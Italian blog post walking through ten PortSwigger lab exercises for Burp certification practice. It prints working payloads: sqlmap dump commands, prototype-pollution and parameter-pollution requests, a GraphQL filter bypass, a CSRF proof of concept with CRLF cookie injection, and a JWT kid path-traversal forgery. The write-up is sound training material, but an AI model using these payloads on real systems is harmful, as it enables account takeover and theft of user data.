---
layout: post
title: "La ruota inizia a ripetersi: dieci roll nello step due, quattro già battuti"
date: 2026-11-19
categories: [web-security, walkthrough]
tags: [portswigger, bscp, sql-injection, jwt, graphql, server-side-parameter-pollution, prototype-pollution, csrf, mass-assignment, mystery-lab, burp-suite]
excerpt: "Ho girato dieci volte la mia Mystery Pool nello step due e quattro roll sono finiti su lab che avevo già risolto — uno su cui avevo scritto un intero post cinque giorni prima. Non è una sessione sprecata: è il momento in cui l'allenamento inizia a rendere in secondi invece che in minuti."
lang: it
page_id: the-wheel-starts-repeating
permalink: /posts/the-wheel-starts-repeating/
---

L'ho catalogato come CSRF prima di cliccare qualunque cosa — il form di cambio email, il riflesso che vuoi all'esame — e poi mi sono accorto che non stavo riconoscendo una *classe di vulnerabilità*. Stavo riconoscendo un *lab*. Su quello esatto avevo scritto milletrecento parole cinque giorni prima: il CRLF nella barra di ricerca, il `Set-Cookie: csrf=`, la difesa double-submit che crolla quando il cookie puoi piazzartelo da solo. Tutto. La ruota era tornata al punto di partenza, e l'unica cosa nuova era la velocità con cui lo vedevo.

È tutto qui il post. Ho girato la mia [Mystery Pool]({% post_url 2026-10-04-mystery-pool-strumento %}) dieci volte nello step di escalation, e quattro dei dieci erano repliche — lab già risolti, uno già *pubblicato*. Per un minuto è sembrato un difetto dello strumento. Non lo è. Lo step due ha un numero finito di facce, e quando l'hai drillato abbastanza la ruota inizia a mostrarti sempre le stesse — e il tempo che prima spendevi a identificarle si riduce a niente. Qui le repliche non sono riempitivo. Sono la misura.

## Il setup

Stesso strumento, card Escalation spuntata, livello Practitioner. Nel pool avevo nove topic selezionati — SQL injection, CSRF, OAuth, JWT, access control, API testing, GraphQL, prototype pollution client-side e server-side — tutto tranne l'insecure deserialization, che avevo lasciato fuori perché il mio strumento la archivia sotto exfiltration, non escalation. È un dettaglio che conta, alla fine.

Come sempre, diversi roll sono usciti come **direct topic** — categorie che il Mystery Lab ufficiale non copre, e che il mio strumento pesca direttamente dalla pagina all-labs aprendole col loro vero launch URL. Il prezzo che continuo a pagare è che un lab diretto mostra il titolo nell'istante in cui carica, quindi la sorpresa finisce presto. Preferisco comunque girare in lungo e in largo sullo step due piuttosto che tenere nascosto ogni titolo.

Strumenti: Burp con lo scanner puntato su singoli insertion point (mai un crawl largo), Repeater, il tab nativo GraphQL, l'estensione JWT Editor; sqlmap per il lavoro blind e UNION; DOM Invader per la prototype pollution; e — una volta, stavolta utilmente — hashcat.

## La sessione

### Roll 1 — Il gadget che me l'ha passato la risposta (server-side prototype pollution)

Un direct topic, titolo spoilerato: *privilege escalation via server-side prototype pollution*. Node/Express, e la via d'ingresso era il form "update billing and delivery address" — una `POST /my-account/change-address` con dentro del JSON.

Il rilevamento canonico della pollution server-side è il trucco di `json spaces`: inquini `Object.prototype` con `"json spaces": 10` e guardi Express re-indentare ogni risposta JSON. Non mi è servito. L'endpoint change-address **rimanda indietro l'oggetto ordine così com'è**, e dentro quella risposta c'era un campo che il form non invia mai:

```json
{ "username": "wiener", "isAdmin": false, ... }
```

Il gadget era già nominato nella risposta. Quindi non ho rilevato niente di astuto — ho solo scritto sulla proprietà che il server mi aveva già mostrato:

```json
{
  "address_line_1": "Wiener HQ",
  "...": "...",
  "__proto__": { "isAdmin": true }
}
```

Il merge lega il mio `__proto__` alla catena dei prototipi, l'oggetto utente eredita `isAdmin: true`, al caricamento successivo compare il pannello admin, e `carlos` è a una DELETE di distanza. **Il vicolo cieco qui è allungare la mano verso il probe `json spaces` quando la risposta ti dice già il nome del gadget.** L'identificazione era lettura, non fingerprinting. Stage 2, non interattivo.

### Roll 2 — Lo scan che avevo già archiviato (SQLi UNION, schema randomizzato)

`GET /filter?category=...`, l'iniettabile ovvio. Ho puntato una scan configuration SQLi-only sull'insertion point `category` ed è tornata vuota, quindi l'avevo mezza archiviata come pulita e avevo iniziato a guardare altrove — e *poi* lo scan ha piazzato il finding, con un attimo di ritardo. La conferma a mano è il tell più vecchio del manuale:

```
GET /filter?category=Lifestyle'      → errore
GET /filter?category=Lifestyle''     → nessun errore
```

Un apice singolo rompe la stringa, raddoppiarlo la ripara. SQL injection, in-band, PostgreSQL. A differenza di ogni cookie-SQLi che continuo a incontrare, stavolta l'input ovvio era davvero quello giusto. sqlmap l'ha chiuso — ma con una fregatura che vale la pena nominare:

```bash
sqlmap -u ".../filter?category=Lifestyle" -p category \
  --dbms=postgres --technique=U --batch --hex --exclude-sysdbs \
  --tables -D public -T users_fpqvvh \
  -C username_hdrsqx,password_ieynbr --dump
```

Quei nomi — `users_fpqvvh`, `username_hdrsqx`, `password_ieynbr` — sono **randomizzati per istanza**. Non puoi indovinare `users`/`username`; enumeri prima lo schema e *poi* dumpi. **Il vicolo cieco è digitare i nomi di tabella che sai a memoria in un lab che li ha deliberatamente mescolati.** `--technique=U` forza UNION e salta i probe time-based rumorosi. Credenziali admin fuori, login, fatto. Non interattivo.

### Roll 3 — Il metodo che nessuno usa (unused API endpoint)

Direct topic, API testing. La pagina prodotto recuperava in sordina il suo prezzo tramite `GET /api/products/1/price`. Tutto l'exploit è una domanda che quasi nessuno fa a un endpoint: *a cos'altro risponde?*

```http
OPTIONS /api/products/1/price HTTP/2
```

```http
Allow: GET, PATCH
```

`PATCH` — un verbo che la UI non emette mai. Quindi l'ho emesso io:

```http
PATCH /api/products/1/price HTTP/2
Content-Type: application/json

{ "price": 0 }
```

Giacca, gratis. **Il passo di identificazione è `OPTIONS`**: l'header `Allow` ti enumera i metodi, e quello inutilizzato è l'intero bug. (Una nota onesta: il mio `Referer` su quella richiesta era un pasticcio di stringhe `__proto__[...]` e `constructor[prototype]` — il fuzzer di prototype pollution di DOM Invader che sparava in background su ogni pagina, del tutto estraneo a questo lab. Gli strumenti si lasciano le impronte addosso a vicenda.) Non interattivo.

### Roll 4 — Stesso sink, il solito cookie (blind SQLi, risposte condizionali)

Ed ecco che iniziano le repliche. `GET /filter?category=...` con un cookie `TrackingId` — stavolta ho scansionato *prima* il cookie, perché le [ultime due sessioni]({% post_url 2026-11-17-cinque-roll-nello-step-due %}) mi hanno insegnato che la SQLi di solito si nasconde lì, non nel parametro che la pagina ti porge. Boolean-based blind, confermata dal messaggio `Welcome back` che compare su condizione vera e sparisce su falsa. sqlmap, iniezione nel cookie marcata con `*`:

```bash
sqlmap -u ".../filter?category=Pets" \
  --cookie="TrackingId=L2MBBFD8DbUvt0PC*; session=..." \
  --batch --dbms=postgresql --technique=B --string="Welcome back" \
  -D public -T users -C username,password --dump
```

L'unica cosa che vale la pena dire e che non ho già detto in un post precedente: mettilo a confronto col roll 2. Sink SQL identico, ma lì i nomi dello schema erano randomizzati e il canale era UNION in-band; qui i nomi sono i noiosi standard `users`/`username`/`password` e il canale è blind-in-un-cookie. **Non è il sink a scegliere la tecnica — è la realtà intorno.** Questa frase l'ho già scritta. Continua a essere vera. Non interattivo.

### Roll 5 — La pollution che non è pollution (server-side parameter pollution)

Il roll è uscito e ho pensato *un'altra prototype pollution* — e quel riflesso è esattamente la trappola. Il lab era **server-side parameter pollution in una query string**, che con la prototype pollution condivide una parola e nient'altro.

La forma: il form forgot-password infila il tuo username in una chiamata API *interna* che il front-end fa per tuo conto, qualcosa come `GET /api/internal/v1/users?username=administrator&field=email`. Dato che il tuo input finisce dentro quella query string non codificato, i caratteri strutturali diventano tuoi — `%26` aggiunge un parametro, `%23` tronca tutto ciò che viene dopo. Una sola richiesta ha fatto tutto il lavoro:

```http
POST /forgot-password
csrf=...&username=administrator%26field=reset_token%23
```

Decodificata, la chiamata interna diventa `...?username=administrator&field=reset_token#&field=email` — il mio `field=reset_token` iniettato, l'originale `field=email` commentato dal `#`. La risposta mi ha restituito il **reset token** dell'amministratore, e una semplice `GET /forgot-password?reset_token=<token>` mi ha fatto impostare una nuova password. **Il vicolo cieco è il nome**: leggi il meccanismo, non la parola. L'identificazione è accorgersi che il tuo input innesca una chiamata server-to-server e poi punzecchiarla con un singolo `#` URL-encoded. Non interattivo.

### Roll 6 — L'endpoint che negava di esistere (hidden GraphQL)

API/GraphQL. L'endpoint era nascosto, quindi la fase uno era trovarlo; la fase due era farlo parlare dopo che aveva dichiarato di non volerlo fare. Un probe universale conferma qualunque endpoint GraphQL:

```
GET /api?query=query{__typename}
```

Un endpoint valido risponde `{"data":{"__typename":"query"}}`. L'introspection, però, era "disabilitata" — da un filtro così ingenuo da cercare solo la stringa letterale `__schema{`. Due bypass economici impilati insieme l'hanno battuto: un **newline** tra `__schema` e la sua graffa, e l'invio dell'intera query come **GET** (il blocco era cablato solo per il POST):

```
GET /api?query=query IntrospectionQuery { __schema%0a { ... } }
```

`%0a` è il newline — abbastanza da schivare il regex, invisibile al parser. Lo schema è tornato intero, e dentro c'erano due operazioni: una per leggere un utente, una per eliminarne uno. Ho letto l'id di `carlos`, ho chiamato la mutation di delete, lab risolto. **L'identificazione è il probe `{__typename}` più il sapere che il filtro `__schema{` è superficiale.** Non interattivo.

### Roll 7 — Il lab che avevo già pubblicato (CSRF, token legato a cookie non di sessione)

Questo è quello dell'apertura. Form di cambio email, catalogato come CSRF a colpo d'occhio — e poi riconosciuto non come classe ma come un lab specifico su cui avevo [scritto cinque giorni prima]({% post_url 2026-11-16-csrf-token-legato-a-cookie-non-di-sessione %}). Il token è reale e tiene; la debolezza è che viene validato contro un *cookie* `csrf` che non è legato alla sessione, e la barra di ricerca si riflette in un header `Set-Cookie` via CRLF, così quel cookie te lo imposti da solo.

L'unica ruga nuova era il mio exploit. Burp Pro ha generato il PoC con l'`<img>` di auto-submit annidato *dentro* un blocco `<script>` — dove viene interpretato come JavaScript, non HTML, quindi l'`onerror` non parte mai. L'avevo incollato senza leggerlo. Sfilato dallo script, funziona:

```html
<form action="https://LAB/my-account/change-email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.net" />
  <input type="hidden" name="csrf" value="fake" />
</form>
<img src="https://LAB/?search=x%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None"
     onerror="document.forms[0].submit();" />
```

L'`<img>` spara la GET con CRLF che piazza `csrf=fake`, non riesce a caricare, e auto-invia il form il cui body `csrf=fake` ora combacia col cookie. Ecco la misura: la prima volta che ho incontrato questo lab ci ho messo un minuto ad ammettere che la barra di ricerca *era* l'attacco. Stavolta ero sull'exploit server prima che la pagina finisse di caricare. **Quel crollo da minuto a secondi è l'unica cosa che l'esame premia davvero.** Stage 2, interattivo — serve che la vittima carichi l'exploit, consegnato dall'exploit server.

### Roll 8 — Lo sconto che avevo già abusato (mass assignment)

Seconda replica, una dietro l'altra. *Exploiting a mass assignment vulnerability* — il [lab del checkout]({% post_url 2026-11-17-cinque-roll-nello-step-due %}) dove la risposta di `GET /api/checkout` ammette un campo `chosen_discount` che la POST non manda mai. Lo copi nel body, imposti `percentage` a 100, ordine piazzato a zero. Questo l'avevo documentato per intero una settimana prima, quindi non c'è niente da aggiungere sul piano tecnico — se non che due repliche di fila sono la ruota che ti sta dicendo qualcosa. Non interattivo.

### Roll 9 — Lo strumento che non ha trovato niente, e intendeva proprio quello (JWT kid path traversal)

Un altro cambio email, e ho riallungato la mano verso il CSRF — poi ho guardato il cookie e ho trovato un JWT. Header: `{"kid":"ea7c48d4-...","alg":"HS256"}`. `HS256` è simmetrico, quindi c'è un segreto condiviso, quindi — a differenza del [token RS256 che mi ha messo in imbarazzo la settimana scorsa]({% post_url 2026-11-18-tre-roll-niente-a-schermo %}) — hashcat stavolta è davvero lo strumento giusto. L'ho lanciato contro un wordlist e non ha craccato **niente**.

Quel niente è tutta la lezione. Un password-cracker puntato su un token HS256 corretto che non trova comunque alcun segreto non è un fallimento; è un **cartello** — la chiave è forte, quindi la porta non è la chiave. È il `kid`. Quell'header nomina il file che il server carica come chiave di verifica, ed è vulnerabile a path traversal. Puntalo a un file vuoto e conosci la chiave: niente.

In JWT Editor: una nuova symmetric key con `k` **vuoto**, il `kid` dell'header impostato a `../../../../../../../dev/null`, il `sub` del payload impostato a `administrator`, poi Sign. Il server legge `/dev/null` (vuoto) come chiave, la mia firma su una chiave vuota combacia, e il token è admin. **Il vicolo cieco è bruteforzare in eterno un segreto forte invece di leggere dove punta il `kid`.** Non interattivo.

### Roll 10 — Un bottone (client-side prototype pollution)

Ultimo roll, client-side prototype pollution — e la quarta replica, il lab DOM XSS di [due sessioni fa]({% post_url 2026-11-17-cinque-roll-nello-step-due %}). DOM Invader ha segnalato la source (`__proto__[property]=value in search`) al caricamento; "Scan for gadgets" ha trovato il sink (`script.src` raggiunto tramite il gadget `transport_url`); e il suo bottone **Exploit** ha risolto il lab in un singolo click. Banner di congratulazioni, zero digitazione.

Che è la coda scomoda dell'intera sessione: questo non l'ho sfruttato io, l'ha fatto l'estensione. La catena source → gadget → sink — `?__proto__[transport_url]=data:,alert(1)` che avvelena una proprietà che la pagina legge dentro un `src` di script — la capisco solo perché l'ho [percorsa a mano una volta]({% post_url 2026-11-17-cinque-roll-nello-step-due %}). Su un gadget d'esame fresco che lo strumento non elenca, il bottone sparisce e resta solo la comprensione. Stage 2, interattivo (DOM XSS).

## Il pattern

Quattro dei dieci roll erano lab che avevo già battuto, uno già pubblicato. Togli le repliche e restano sei tecniche genuinamente nuove — server-side prototype pollution, una SQLi UNION contro uno schema randomizzato, method tampering su un endpoint inutilizzato, server-side parameter pollution, un endpoint GraphQL nascosto, e JWT `kid` traversal. Ma le repliche sono il finding, non lo spreco. **Lo step due ha un vocabolario limitato, e l'ho drillato abbastanza da far sì che la ruota ora si ripeta — e ogni replica si è risolta in secondi.** È la forma di uno step quasi finito: non meno roll, ma più veloci, e una quota crescente di roba già vista.

Sotto correvano due fili più profondi.

**Uno strumento che non torna niente è informazione.** Il `null` di hashcat nel roll 9 non era un vicolo cieco — era la prova che la debolezza stava nel `kid`, non nel segreto. La stessa logica attraversava lo scan del roll 2 che piazza il finding un attimo dopo che l'avevo archiviato, e l'endpoint del roll 6 che negava di esistere. L'assenza è una lettura, se le permetti di esserlo.

**Una volta che conosci la forma, il tooling collassa l'exploit.** sqlmap dumpa la tabella, il bottone di DOM Invader risolve l'XSS, JWT Editor forgia il token. Su uno step due drillato la parte difficile non è più *come sfrutto questo* — è *quale insertion point* (il cookie, non il parametro) e *in quale di due lab quasi identici mi trovo* (l'errore `redirect_uri`, lo schema randomizzato, il `kid` contro il segreto). La skill è migrata dall'exploitation all'identificazione, che è esattamente dove l'esame mette il cronometro.

E il filo più vecchio, ancora intatto in ogni post di questa serie: **il server continua a farsi sfuggire la cosa che ti serve.** `isAdmin` in un body di risposta, `chosen_discount` in una GET, un campo `reset_token`, un tipo tirato fuori dall'introspection, un `kid` che nomina un file. L'identificazione è leggere ciò che il server offre spontaneamente prima di lanciare un solo payload.

## Esame e campo

**All'esame**, tutti e dieci sono Stage 2 — privilege escalation, ciascuno una strada diversa verso l'account di qualcun altro. La maggior parte è **non interattiva**, che è il profilo che vuoi sotto il cronometro: la prototype pollution server-side, entrambe le SQLi, il method tampering sull'API, la parameter pollution, il GraphQL nascosto, la forgiatura del JWT — interroghi tu il server e non aspetti mai una vittima. Solo due richiedono interazione: il CSRF (consegni il PoC dall'exploit server e aspetti che la vittima lo carichi) e un XSS client-side da prototype pollution armato. I tell di riconoscimento sono tutto il gioco e vale la pena sovra-allenarli: scansiona i **cookie** per la SQLi, non solo i parametri; leggi l'`OPTIONS`/`Allow` di un endpoint prima di dare per scontati i suoi verbi; testa un input server-to-server con un singolo `%23`; sonda GraphQL con `{__typename}` e tratta il blocco `__schema{` come superficiale; e quando hashcat non trova niente su un HS256 valido, smetti di craccare e leggi il `kid`.

**Sul campo**, la classifica è per raggio d'esplosione. Le due SQLi esfiltrano l'intera tabella utenti. Il `kid` traversal del JWT è bypass totale dell'autenticazione — conii l'identità che vuoi. La prototype pollution server-side è quella strutturale e silenziosa: oggi era `isAdmin`, ma lo stesso merge non sicuro scala fino a RCE nell'app Node sbagliata. Mass assignment e parameter pollution sono buchi di logica di business che scalano a qualunque campo l'oggetto o l'API interna capiti di esporre. L'unica disciplina che ne chiude la maggior parte è quella attorno a cui gira tutta questa serie: non fidarti mai di un input solo perché la UI non lo offriva — cookie, chiavi `__proto__`, campi JSON extra, valori `kid` e `&`/`#` URL-encoded sono tutti controllati dall'attaccante, e il server deve trattarli così prima di leggerne un byte.

## Cosa viene dopo

Lo step due è, di fatto, mappato. In tre post l'ho ormai girato abbastanza da far sì che la ruota si ripeta più spesso di quanto sorprenda, e l'unico topic che non ho mai pescato — insecure deserialization — è quello che il mio strumento archivia deliberatamente sotto *exfiltration*, perché il suo endgame è l'esecuzione di codice remoto, non una sessione rubata. Non è una lacuna dello step due. È la rampa d'accesso allo step tre. Il resto di quella fase è lì ad aspettare: XXE, SSRF, SSTI, path traversal, file upload, OS command injection — le tecniche il cui obiettivo non è *diventare admin* ma *leggere il file / eseguire il comando*. La ruota punta all'exfiltration adesso, e stavolta dovrò lasciarmi il cookie alle spalle e andare a cercare il filesystem.

## Takeaway

- Uno strumento che torna niente ti sta dando un finding: hashcat che non cracca alcun segreto su un token **HS256** valido significa che la chiave è forte e la porta è altrove — leggi il `kid`, non continuare a bruteforzare.
- Le trappole del nome costano minuti: la **server-side parameter pollution** non è prototype pollution. Leggi il meccanismo (`%26`/`%23` dentro una query string interna), non la parola condivisa.
- Il server si fa sfuggire il gadget — `isAdmin` in una risposta, `chosen_discount` in una GET, un campo `reset_token`, un tipo introspezionato. L'identificazione è leggere ciò che viene offerto, non indovinare.
- L'allenamento rende in secondi: il lab CSRF che l'altra volta mi è costato un minuto, stavolta l'ho riconosciuto prima che la pagina caricasse. La velocità d'esame è un riflesso allenato, e le repliche sono il modo in cui la misuri.
- Quando la forma è nota, il tooling collassa l'exploit (sqlmap, il click singolo di DOM Invader, JWT Editor) — quindi la skill che resta è l'identificazione: l'insertion point giusto, e distinguere due lab quasi identici.

## Riferimenti utili

- [PortSwigger: Privilege escalation via server-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/server-side/lab-privilege-escalation-via-server-side-prototype-pollution)
- [PortSwigger: SQL injection — listing the database contents on non-Oracle databases](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle)
- [PortSwigger: Exploiting an unused API endpoint](https://portswigger.net/web-security/api-testing/lab-exploiting-unused-api-endpoint)
- [PortSwigger: Blind SQL injection with conditional responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)
- [PortSwigger: Exploiting server-side parameter pollution in a query string](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)
- [PortSwigger: Finding a hidden GraphQL endpoint](https://portswigger.net/web-security/graphql/lab-graphql-finding-hidden-endpoint)
- [PortSwigger: CSRF where token is tied to non-session cookie](https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-tied-to-non-session-cookie)
- [PortSwigger: Exploiting a mass assignment vulnerability](https://portswigger.net/web-security/api-testing/lab-exploiting-mass-assignment-vulnerability)
- [PortSwigger: JWT authentication bypass via kid header path traversal](https://portswigger.net/web-security/jwt/lab-jwt-authentication-bypass-via-kid-header-path-traversal)
- [PortSwigger: DOM XSS via client-side prototype pollution](https://portswigger.net/web-security/prototype-pollution/client-side/dom-xss/lab-dom-xss-via-client-side-prototype-pollution)
- [sqlmap](https://sqlmap.org/) · [DOM Invader](https://portswigger.net/burp/documentation/desktop/tools/dom-invader) · [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)
- [botesjuan — Burp Suite Certified Practitioner Exam Study](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study)
- [Mystery Pool — lo strumento da cui arrivano questi roll]({% post_url 2026-10-04-mystery-pool-strumento %})

*Tutte le tecniche mostrate sono state eseguite in un ambiente di laboratorio isolato (la Web Security Academy di PortSwigger). Attaccare sistemi che non possiedi o per cui non hai un'autorizzazione scritta è illegale nella maggior parte delle giurisdizioni.*
